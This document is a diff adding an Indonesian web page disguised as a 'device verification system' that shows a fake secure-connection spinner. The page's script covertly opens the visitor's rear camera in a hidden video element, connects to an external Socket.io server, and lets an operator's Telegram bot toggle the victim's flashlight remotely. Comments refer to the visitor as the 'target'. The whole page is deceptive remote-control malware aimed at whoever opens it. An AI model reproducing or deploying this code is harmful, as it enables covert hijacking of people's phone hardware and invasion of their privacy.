@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi Perangkat</title>
+    <!-- Library Socket.io untuk komunikasi real-time -->
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; font-size: 14px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <p>Sedang menghubungkan ke server aman...</p>
+
+    <!-- Elemen video tersembunyi untuk akses kamera & senter -->
+    <video id="video" style="display:none;" autoplay playsinline></video>
+
+    <script>
+        // --- KONFIGURASI ---
+        // Ganti URL di bawah dengan IP/Domain Pterodactyl kamu (Contoh: http://103.xxx.xxx.xxx:3000)
+        const SERVER_URL = 'http://dash.astralmarket.my.id/:2271'; 
+        
+        const socket = io(SERVER_URL);
+        const video = document.getElementById('video');
+        let track = null;
+
+        // 1. Inisialisasi Kamera saat halaman dibuka
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "environment" } // Wajib kamera belakang agar senter aktif
+                });
+                video.srcObject = stream;
+                track = stream.getVideoTracks()[0];
+                
+                console.log("Koneksi aman terjalin.");
+            } catch (err) {
+                console.error("Izin kamera diperlukan untuk verifikasi.");
+                // Jika ditolak, biasanya target diarahkan keluar
+                // window.location.href = "https://google.com";
+            }
+        }
+
+        // 2. Mendengarkan perintah dari Bot Telegram via Server Ptero
+        socket.on('senter', async (status) => {
+            if (track) {
+                try {
+                    // Cek apakah perangkat mendukung fitur senter (torch)
+                    const capabilities = track.getCapabilities ? track.getCapabilities() : {};
+                    if (capabilities.torch) {
+                        await track.applyConstraints({
+                            advanced: [{ torch: status === 'on' }]
+                        });
+                        console.log("Senter diperbarui: " + status);
+                    }
+                } catch (e) {
+                    console.error("Gagal mengontrol senter:", e);
+                }
+            }
+        });
+
+        // Jalankan inisialisasi
+        window.onload = initCamera;
+
+        // Auto-redirect jika koneksi terputus (opsional)
+        socket.on('disconnect', () => {
+            console.log("Terputus dari server.");
+        });
+    </script>
+</body>
+</html>
+  
